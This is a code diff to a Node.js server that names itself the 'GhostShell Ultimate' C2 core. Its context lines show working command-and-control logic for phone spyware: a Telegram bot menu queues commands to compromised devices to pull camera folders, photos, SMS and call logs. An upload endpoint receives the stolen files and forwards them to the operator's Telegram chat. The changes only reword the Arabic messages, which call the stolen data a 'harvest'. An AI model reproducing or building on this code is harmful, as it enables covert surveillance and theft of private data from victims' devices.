@@ -45,7 +45,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] ELITE RAW BINARY C2 CORE ONLINE [⚔️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] GHOSTSHELL ULTIMATE C2 CORE ONLINE [⚔️]</h1></body></html>`);
 });
 
 app.post('/api/v3/unified/upload_raw', async (req, res) => {
@@ -67,13 +67,13 @@ app.post('/api/v3/unified/upload_raw', async (req, res) => {
         const stats = fs.statSync(finalPath);
         const fileSizeMB = stats.size / (1024 * 1024);
 
-        await sendTg(`🔥 <b>تم سحب مجلد/ملف ضخم بنجاح (بث ثنائي خام حقيقي)!</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 الملف: <code>${safeName}</code>\n📊 الحجم: <code>${fileSizeMB.toFixed(2)} MB</code>`);
+        await sendTg(`🔥 <b>حصاد أسطوري تم استلامه (بث ثنائي صامد)!</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 الملف: <code>${safeName}</code>\n📊 الحجم: <code>${fileSizeMB.toFixed(2)} MB</code>`);
 
         if (fileSizeMB > 50) {
-            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه على السيرفر.`);
+            await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه بأمان على السيرفر.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
-                caption: `👑 <b>أرشيف الكاميرا / المجلد المسحوب:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                caption: `👑 <b>أرشيف الحصاد المسحوب:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
             });
         }
 
@@ -132,7 +132,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `📱 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة النخبوية:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
+            await sendTg(`🔥 <b>غرفة قيادة GhostShell Ultimate:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -148,11 +148,11 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '👑 سحب مجلد الكاميرا والوسائط (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
-                    { text: '📸 سحب أحدث الصور', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
+                    { text: '👑 حصاد شامل (مسح + ضغط + إرسال ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '📸 أحدث صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
                 ],
                 [
-                    { text: '📨 سحب الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
+                    { text: '📨 الرسائل', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                     { text: '📞 سجل المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                 ],
                 [
@@ -174,8 +174,8 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم حقن أمر [${action}] بنجاح!` });
-            await sendTg(`⚡ <b>أمر [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
+            await appBot.answerCallbackQuery(query.id, { text: `🚀 تم حقن أمر الحصاد [${action}] بنجاح!` });
+            await sendTg(`⚡ <b>أمر الحصاد [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
@@ -184,4 +184,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Elite Raw Binary Core Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] GhostShell Ultimate C2 Core Online on port ${PORT}`));
